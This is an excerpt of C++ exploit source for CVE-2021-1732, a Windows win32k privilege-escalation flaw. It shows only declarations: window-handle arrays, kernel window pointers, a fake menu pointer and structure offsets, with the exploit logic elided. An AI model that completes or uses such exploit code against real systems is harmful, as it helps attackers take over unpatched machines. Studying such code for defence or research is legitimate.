...
namespace CVE_2021_1732
{
    ...
    typedef PVOID(WINAPI* FRtlAllocateHeap)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
    ...
    inline FRtlAllocateHeap RtlAllocateHeap = nullptr;

    inline std::vector<HWND> g_HWNDs;
    inline std::vector<PVOID> g_HWNDKs;
    const size_t magicExtra = 0xDEAD;
    inline HWND tagWNDK_0;
    inline HWND tagWNDK_1;
    inline HWND choosenOne;

    inline PVOID pTagWNDK_0 = nullptr;
    inline PVOID pTagWNDK_1 = nullptr;

    // inline struct _MENU_USER* g_fakeMenu = nullptr;
    inline ULONG_PTR g_fakeMenu = 0;

    //////////// offset
    inline size_t tag0_reverseBaseOffset = 0;
    inline size_t tag1_reverseBaseOffset = 0;
    inline size_t tag2_reverseBaseOffset = 0;
    inline size_t tag0_extraByteAddr = 0;
